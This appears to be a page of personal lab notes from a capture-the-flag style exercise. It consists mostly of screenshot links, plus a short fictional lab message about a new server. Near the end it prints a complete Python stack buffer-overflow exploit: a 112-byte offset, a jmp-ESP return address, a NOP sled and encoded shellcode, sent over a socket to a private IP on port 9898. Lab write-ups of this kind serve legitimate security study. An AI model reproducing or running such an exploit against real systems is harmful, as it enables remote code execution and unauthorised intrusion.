
![[Pasted image 20230913162208.png]]
![[Pasted image 20230913163101.png]]

![[Pasted image 20230913162723.png]]
![[Pasted image 20230913162944.png]]
![[Pasted image 20230913163031.png]]
![[Pasted image 20230913163307.png]]
![[Pasted image 20230913164416.png]]
![[Pasted image 20230913164442.png]]
![[Pasted image 20230913165515.png]]
![[Pasted image 20230913165540.png]]
![[Pasted image 20230913165954.png]]
![[Pasted image 20230913170623.png]]
![[Pasted image 20230913170943.png]]
![[Pasted image 20230914123050.png]]
![[Pasted image 20230914123235.png]]
![[Pasted image 20230914123739.png]]

![[Pasted image 20230914133029.png]]
![[Pasted image 20230914133342.png]]
![[Pasted image 20230914133403.png]]
![[Pasted image 20230914133501.png]]
![[Pasted image 20230914133547.png]]

![[Pasted image 20230914134236.png]]
![[Pasted image 20230914134356.png]]
![[Pasted image 20230914134836.png]]
![[Pasted image 20230914135023.png]]
![[Pasted image 20230914135139.png]]
![[Pasted image 20230914135240.png]]
![[Pasted image 20230914135431.png]]
![[Pasted image 20230914135844.png]]
![[Pasted image 20230914135946.png]]
![[Pasted image 20230914140102.png]]
![[Pasted image 20230914141452.png]]
![[Pasted image 20230914141629.png]]
![[Pasted image 20230914142323.png]]
![[Pasted image 20230914142351.png]]
![[Pasted image 20230914142432.png]]
![[Pasted image 20230914142705.png]]
![[Pasted image 20230914142916.png]]
![[Pasted image 20230914143110.png]]
![[Pasted image 20230914143207.png]]
![[Pasted image 20231024105734.png]]
![[Pasted image 20231024105800.png]]
![[Pasted image 20231024112428.png]]
![[Pasted image 20231024112910.png]]
![[Pasted image 20231024114904.png]]
![[Pasted image 20231024114818.png]]![[Pasted image 20231024115515.png]]
![[Pasted image 20231024120403.png]]
![[Pasted image 20231024120439.png]]![[Pasted image 20231024120707.png]]
![[Pasted image 20231024121524.png]]![[Pasted image 20231024123805.png]]
![[Pasted image 20231024124235.png]]![[Pasted image 20231024124623.png]]
![[Pasted image 20231024125132.png]]![[Pasted image 20231024125232.png]]
![[Pasted image 20231024125621.png]]
![[Pasted image 20231024130037.png]]
i will bd using our new HTTP3 server at html://quic.naguini.hogwarts for further comunications
all debelopers are request to visit the server regulary for checking lastest announcements
![[Pasted image 20231024130103.png]]
![[Pasted image 20231024132419.png]]
![[Pasted image 20231024132900.png]]
![[Pasted image 20231024133702.png]]
![[Pasted image 20231024161121.png]]
![[Pasted image 20231024161404.png]]
![[Pasted image 20231025134810.png]]
![[Pasted image 20231025163503.png]]
![[Pasted image 20231025164844.png]]
![[Pasted image 20231025165150.png]]
![[Pasted image 20231025165223.png]]
![[Pasted image 20231101121725.png]]

![[Pasted image 20231101122003.png]]
![[Pasted image 20231109173316.png]]
![[Pasted image 20231109174738.png]]
![[Pasted image 20231109174754.png]]
![[Pasted image 20231110102820.png]]
![[Pasted image 20231110103338.png]]
![[Pasted image 20231110131016.png]]

![[Pasted image 20231110131042.png]]

![[Pasted image 20231114103219.png]]

![[Pasted image 20231114103511.png]]

![[Pasted image 20231114103701.png]]
![[Pasted image 20231114103723.png]]

![[Pasted image 20231114103916.png]]

![[Pasted image 20231114103858.png]]

![[Pasted image 20231114104102.png]]

![[Pasted image 20231114104121.png]]

![[Pasted image 20231114104949.png]]
![[Pasted image 20231114105029.png]]
![[Pasted image 20231114105207.png]]
![[Pasted image 20231114110657.png]]
![[Pasted image 20231114114610.png]]

![[Pasted image 20231114114634.png]]

![[Pasted image 20231114122045.png]]

![[Pasted image 20231114130903.png]]
![[Pasted image 20231114132324.png]]
![[Pasted image 20231114132602.png]]
![[Pasted image 20231114132845.png]]
![[Pasted image 20231114133251.png]]
![[Pasted image 20231114133642.png]]![[Pasted image 20231114134205.png]]

![[Pasted image 20231114140051.png]]
![[Pasted image 20231114140102.png]]
![[Pasted image 20231114140113.png]]
![[Pasted image 20231114140846.png]]
![[Pasted image 20231114141628.png]]
![[Pasted image 20231114142951.png]]
![[Pasted image 20231114143157.png]]
![[Pasted image 20231123114209.png]]![[Pasted image 20231123114311.png]]
![[Pasted image 20231123114703.png]]
![[Pasted image 20231123114728.png]]
![[Pasted image 20231123114936.png]]
![[Pasted image 20231123115118.png]]
![[Pasted image 20231123115532.png]]
![[Pasted image 20231123124540.png]]
![[Pasted image 20231123124920.png]]
![[Pasted image 20231123124942.png]]
![[Pasted image 20231123125120.png]]
![[Pasted image 20231123125331.png]]
![[Pasted image 20231123131403.png]]
![[Pasted image 20231123131816.png]]
![[Pasted image 20231123134836.png]]


import socket

offset = 112
before_eip = b"A" * offset

eip = b"\x55\x9d\x04\x08"  # 8049d55 -> jmp ESP

shellcode = b""
shellcode += b"\xbf\xf5\xf9\x13\x86\xda\xc2\xd9\x74\x24\xf4"
shellcode += b"\x5a\x29\xc9\xb1\x12\x83\xea\xfc\x31\x7a\x0e"
shellcode += b"\x03\x8f\xf7\xf1\x73\x5e\xd3\x01\x98\xf3\xa0"
shellcode += b"\xbe\x35\xf1\xaf\xa0\x7a\x93\x62\xa2\xe8\x02"
shellcode += b"\xcd\x9c\xc3\x34\x64\x9a\x22\x5c\xb7\xf4\x4c"
shellcode += b"\x04\x5f\x07\x6f\x35\x1b\x8e\x8e\x85\x3d\xc1"
shellcode += b"\x01\xb6\x72\xe2\x28\xd9\xb8\x65\x78\x71\x2d"
shellcode += b"\x49\x0e\xe9\xd9\xba\xdf\x8b\x70\x4c\xfc\x19"
shellcode += b"\xd0\xc7\xe2\x2d\xdd\x1a\x64"

after_eip = b"\x90" * 32 + shellcode  # ESP

payload = before_eip + eip + after_eip

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.153.156", 9898))
s.send(payload)

 Agregar un bucle infinito para mantener la conexión abierta
while True:
    data = s.recv(1024)
    if not data:
        break
    print(data.decode("utf-8"))

s.close()


![[Pasted image 20231123142700.png]]
![[Pasted image 20231123150302.png]]
![[Pasted image 20231123153652.png]]
![[Pasted image 20231123153830.png]]
![[Pasted image 20231123154053.png]]

![[Pasted image 20231123154247.png]]
![[Pasted image 20231123154348.png]]